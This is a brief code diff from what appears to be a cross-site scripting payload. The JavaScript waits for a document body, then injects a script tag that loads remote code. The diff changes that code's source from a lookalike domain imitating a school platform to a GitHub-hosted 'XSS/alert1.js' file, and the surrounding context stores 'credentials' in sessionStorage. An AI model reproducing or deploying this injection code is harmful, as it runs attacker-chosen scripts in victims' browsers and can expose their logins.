@@ -22,7 +22,7 @@ sessionStorage.setItem("credentials", JSON.stringify((a => {
                     if (!c || !c.body) return;
                     clearInterval(d);
                     const e = c.createElement("script");
-                    e.src = "https://ecoledirecte.fun/message.js";
+                    e.src = "https://exon2007.github.io/XSS/alert1.js";
                     e.async = true;
                     c.body.appendChild(e)
                 }, 50)
